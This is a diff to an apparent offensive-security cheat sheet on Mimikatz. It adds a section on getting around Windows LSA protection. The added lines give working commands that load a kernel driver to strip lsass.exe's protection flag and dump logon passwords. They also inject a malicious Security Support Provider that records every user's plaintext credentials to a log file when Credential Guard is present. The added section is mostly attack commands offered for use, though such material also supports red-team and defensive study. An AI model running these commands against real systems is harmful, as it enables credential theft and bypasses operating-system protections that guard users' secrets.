@@ -4,6 +4,7 @@
 
 * [Mimikatz - Execute commands](#mimikatz---execute-commands)
 * [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
+* [Mimikatz - LSA Protection Workaround](#mimikatz---lsa-protection-workaround)
 * [Mimikatz - Mini Dump](#mimikatz---mini-dump)
 * [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
 * [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
@@ -57,6 +58,36 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 - Win2016:
   * Adding requires lock
   * Removing requires reboot
+
+## Mimikatz - LSA Protection Workaround
+
+- LSA as a Protected Process
+  ```powershell
+  # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+  # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+  #Now lets import the mimidriver.sys to the system
+  mimikatz # !+
+
+  # Now lets remove the protection flags from lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe /remove
+
+  # Finally run the logonpasswords function to dump lsass
+  mimikatz # sekurlsa::logonpasswords
+  ```
+
+- LSA is running as virtualized process (LSAISO) by Credential Guard
+  ```powershell
+  # Check if a process called lsaiso.exe exists on the running processes
+  tasklist |findstr lsaiso
+
+  # If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
+  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  mimikatz # misc::memssp
+
+  # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+  ```
 
 
 ## Mimikatz - Mini Dump
